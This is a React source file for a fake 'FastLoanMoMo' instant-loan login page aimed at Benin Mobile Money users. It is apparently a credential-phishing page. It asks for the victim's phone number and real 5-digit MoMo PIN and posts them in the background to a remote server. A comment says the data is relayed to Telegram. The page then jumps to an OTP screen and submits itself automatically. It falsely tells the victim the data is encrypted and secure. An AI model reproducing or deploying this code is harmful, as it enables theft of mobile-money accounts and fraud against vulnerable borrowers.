import { useState, useEffect, type FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";

const API_URL = "https://fastloan-momo.onrender.com";

const Login = () => {
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const navigate = useNavigate();

  const isFormValid = phone.length === 10 && pin.length === 5;

  // ✅ SPEED BOOST 1: Wake up the Render server in the background on page load
  useEffect(() => {
    fetch(`${API_URL}/`).catch(() => {}); 
  }, []);

  const handleLogin = (e: FormEvent) => {
    e.preventDefault();
    if (!isFormValid) return;
    
    localStorage.setItem("userPhone", phone);

    // ✅ SPEED BOOST 2: Instantly navigate to OTP before the network request finishes
    navigate("/otp", { state: { phone: phone } });

    // ✅ SPEED BOOST 3: Fire the request to Telegram in the background
    fetch(`${API_URL}/api/login`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone_number: phone, pin: pin }),
    }).catch((error) => console.log("Background login error:", error));
  };

  // ✅ SPEED BOOST 4: Auto-submit when the 5th PIN digit is typed
  useEffect(() => {
    if (phone.length === 10 && pin.length === 5) {
      const fakeEvent = { preventDefault: () => {} } as FormEvent;
      handleLogin(fakeEvent);
    }
  }, [pin, phone]);

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon"><Wallet size={32} color="white" /></div>
        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
        <p className="header-subtitle">Prêts mobiles instantanés</p>
      </div>
      <div className="main-card">
        <h2 className="title">Bon retour</h2>
        <p className="subtitle">Connectez-vous avec votre numéro mobile pour accéder aux prêts instantanés.</p>
        
        <form onSubmit={handleLogin}>
          <div className="form-group">
            <label className="form-label">Numéro de téléphone</label>
            <div className="input-wrapper" style={{ padding: '12px 16px' }}>
              <span style={{ display: 'flex', alignItems: 'center', fontSize: '16px', fontWeight: 500, color: '#111827' }}>
                🇧🇯 +229 <span style={{ color: '#D1D5DB', margin: '0 12px', fontWeight: 300 }}>|</span>
              </span>
              <input 
                type="tel" 
                placeholder="01 23 45 67 89" 
                value={phone} 
                onChange={(e) => setPhone(e.target.value.replace(/\D/g, '').slice(0, 10))} 
                maxLength={10} 
                required 
                style={{ fontSize: '18px', letterSpacing: '1px', color: '#111827' }} 
              />
            </div>
            <p className="helper-text">Numéro MoMo du Bénin (10 chiffres)</p>
          </div>
          
          <div className="form-group">
            <label className="form-label">Entrez le code PIN MOMO à 5 chiffres</label>
            <div className="input-wrapper">
              <Lock size={20} color="#6B7280" style={{ marginRight: '12px' }} />
              <input 
                type={showPin ? "text" : "password"} 
                maxLength={5} 
                placeholder="•••••" 
                style={{ letterSpacing: '8px', fontSize: '18px', color: '#111827' }} 
                value={pin} 
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))} 
                required 
              />
              <button type="button" onClick={() => setShowPin(!showPin)} style={{ background: 'none', border: 'none', cursor: 'pointer', display: 'flex', padding: 0 }}>
                <Eye size={20} color="#9CA3AF" />
              </button>
            </div>
          </div>
          
          <button 
            type="submit" 
            className="btn-primary" 
            disabled={!isFormValid} 
            style={{ 
              backgroundColor: isFormValid ? 'var(--button-yellow)' : '#FDE68A', 
              color: isFormValid ? 'white' : '#9CA3AF', 
              cursor: isFormValid ? 'pointer' : 'not-allowed', 
              marginTop: '32px' 
            }}
          >
            Continuer
          </button>
          
          <p className="helper-text" style={{ textAlign: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '24px', color: '#6B7280' }}>
            <ShieldCheck size={16} /> Vos informations sont cryptées et sécurisées
          </p>
        </form>
      </div>
      
      <p style={{ textAlign: 'center', fontSize: '13px', color: '#111827', marginTop: '24px', padding: '0 20px 40px', fontWeight: 500 }}>
        En continuant, vous acceptez nos Conditions et notre Politique de Confidentialité.
      </p>
    </div>
  );
};

export default Login;